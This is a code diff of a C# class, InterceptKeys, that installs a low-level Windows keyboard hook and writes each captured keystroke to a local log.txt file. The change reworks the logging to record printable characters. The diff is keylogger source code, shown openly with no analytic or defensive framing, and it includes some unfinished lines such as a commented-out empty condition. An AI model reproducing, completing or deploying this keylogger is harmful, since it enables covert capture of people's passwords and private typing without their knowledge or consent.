@@ -31,13 +31,13 @@ class InterceptKeys
     private delegate IntPtr LowLevelKeyboardProc(
         int nCode, IntPtr wParam, IntPtr lParam);
 
-    private static IntPtr HookCallback(
-        int nCode, IntPtr wParam, IntPtr lParam)
+    private static IntPtr HookCallback( int nCode, IntPtr wParam, IntPtr lParam)
     {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vkCode = Marshal.ReadInt32(lParam);
             Console.WriteLine((Keys)vkCode);
+
             char key = Convert.ToChar(vkCode);
             writeToFile((Keys)vkCode);
         }
@@ -46,10 +46,19 @@ class InterceptKeys
 
     private static void writeToFile(Keys p)
     {
-        String name = (new KeysConverter()).ConvertToString(p);
-        using (StreamWriter writer = new StreamWriter("log.txt", true))
+        char key = Convert.ToChar(p);
+        if (key == 32)
+            key = ' ';
+       // else if (key == )
+
+
+        if (key > 31 && key < 126)
         {
-            writer.Write(name);
+            //String name = (new KeysConverter()).ConvertToString(p);
+            using (StreamWriter writer = new StreamWriter("log.txt", true))
+            {
+                writer.Write(key.ToString());
+            }
         }
     }
 
